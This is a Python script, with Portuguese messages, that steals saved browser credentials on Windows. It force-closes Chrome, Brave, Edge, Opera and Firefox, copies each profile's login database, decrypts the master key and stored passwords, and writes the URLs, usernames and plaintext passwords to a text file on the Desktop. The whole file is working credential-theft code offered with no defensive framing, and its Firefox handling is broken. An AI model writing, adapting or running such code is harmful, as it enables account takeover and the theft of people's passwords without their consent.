import sqlite3
import base64
import json
import os
import time
import shutil
from Crypto.Cipher import AES
import win32crypt
import ctypes
import traceback


def get_desktop_path():
    csidl_desktop = 0x0010
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(0, csidl_desktop, 0, 0, buf)
    return buf.value


OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "BrowserPasswords.txt")
TEMP_DB_FILE = "temp_BrowserPasswords.db"


def get_key(keypath):
    try:
        if not os.path.exists(keypath):
            raise FileNotFoundError(f"O arquivo '{keypath}' não foi encontrado.")

        with open(keypath, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encryption_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return encryption_key
    except FileNotFoundError as fnf_error:
        print(f"[ERROR] {fnf_error}")
    except json.JSONDecodeError as json_error:
        print(f"[ERROR] Erro ao decodificar JSON: {json_error}")
    except Exception as e:
        print(f"[ERROR] Erro ao obter a chave: {e}")
        traceback.print_exc()
    return None


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(f"[DEBUG] Falha com AES GCM: {e}")
        try:
            iv = password[:16]
            cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
            decrypted_password = cipher.decrypt(password[16:])
            return decrypted_password.rstrip(b"\x00").decode()
        except Exception as e:
            print(f"[DEBUG] Falha com AES CBC: {e}")
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception as e:
                print(f"[ERROR] Erro na descriptografia alternativa: {e}")
                traceback.print_exc()
    return "Sem senhas"


def close_browser_process(browser_name):
    import psutil
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == browser_name:
            try:
                proc.kill()
            except psutil.NoSuchProcess:
                pass
            except psutil.AccessDenied:
                print(f"[ERROR] Acesso negado ao processo {proc.info['pid']}.")


def remove_temp_file():
    attempts = 0
    while attempts < 5:
        try:
            if os.path.exists(TEMP_DB_FILE):
                os.remove(TEMP_DB_FILE)
            break
        except Exception as e:
            print(f"[ERROR] Erro ao remover arquivo temporário na tentativa {attempts+1}: {e}")
            attempts += 1
            time.sleep(2)


def get_credentials(dbpath, keypath, browser_name):
    credentials_found = False
    collected_info = []
    try:
        if not os.path.exists(dbpath):
            raise FileNotFoundError(f"O arquivo do banco de dados '{dbpath}' não foi encontrado.")

        close_browser_process(f"{browser_name}.exe")
        time.sleep(5)

        if os.path.exists(TEMP_DB_FILE):
            os.remove(TEMP_DB_FILE)
        shutil.copyfile(dbpath, TEMP_DB_FILE)
        time.sleep(5)

        with sqlite3.connect(TEMP_DB_FILE) as db:
            cursor = db.cursor()
            cursor.execute("PRAGMA busy_timeout = 5000;")
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used"
            )
            for row in cursor.fetchall():
                main_url, user_name, password = row
                decrypted_password = password_decryption(password, get_key(keypath))
                if user_name or decrypted_password:
                    credentials_found = True
                    info = (f"Browser: {browser_name}\n"
                            f"URL Principal: {main_url}\n"
                            f"Nome de usuário: {user_name}\n"
                            f"Senha descriptografada: {decrypted_password}\n")
                    collected_info.append(info)
            cursor.close()
        db.close()
    except FileNotFoundError as fnf_error:
        print(f"[ERROR] {fnf_error}")
    except sqlite3.OperationalError as sql_error:
        print(f"[ERROR] Erro operacional do SQLite: {sql_error}")
    except Exception as e:
        print(f"[ERROR] Erro inesperado: {e}")
        traceback.print_exc()
    finally:
        remove_temp_file()
        if not credentials_found:
            collected_info.append(f"Browser: {browser_name}\nNenhuma senha ou login encontrado.\n")
    return collected_info


def process_browsers():
    browser_loc = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
        "Firefox": os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    }

    all_credentials_info = []

    for browser_name, root_path in browser_loc.items():
        if not os.path.exists(root_path):
            print(f"[ERROR] O diretório de perfis do {browser_name} '{root_path}' não foi encontrado.")
            continue

        profiles = [i for i in os.listdir(root_path) if i.startswith("Profile") or i == "Default"]

        if browser_name == "Firefox":
            profiles = [i for i in os.listdir(root_path) if os.path.isdir(os.path.join(root_path, i))]

        for profile in profiles:
            profile_path = os.path.join(root_path, profile)
            print(f"[DEBUG] Processando dados do perfil '{profile}' ({browser_name})")
            db_path = os.path.join(profile_path, "Login Data")
            key_path = os.path.join(root_path, "Local State") if browser_name != "Firefox" else None
            profile_credentials_info = get_credentials(db_path, key_path, browser_name)
            all_credentials_info.extend(profile_credentials_info)
            print(f"[DEBUG] Sucesso para o perfil '{profile}' ({browser_name})")

    if all_credentials_info:
        try:
            with open(OUTPUT_FILE_PATH, "w") as f:
                f.write("\n".join(all_credentials_info))
            print(f"[DEBUG] Extração de dados concluída. Verifique o arquivo na sua Área de Trabalho.")
        except Exception as e:
            print(f"[ERROR] Erro ao criar o arquivo de saída: {e}")
            traceback.print_exc()
    else:
        print(f"[DEBUG] Arquivo não criado. Verifique por erros.")


try:
    process_browsers()
except Exception as e:
    print(f"[ERROR] Erro encontrado durante o processamento: {e}")
    traceback.print_exc()

input("Pressione Enter para sair...")
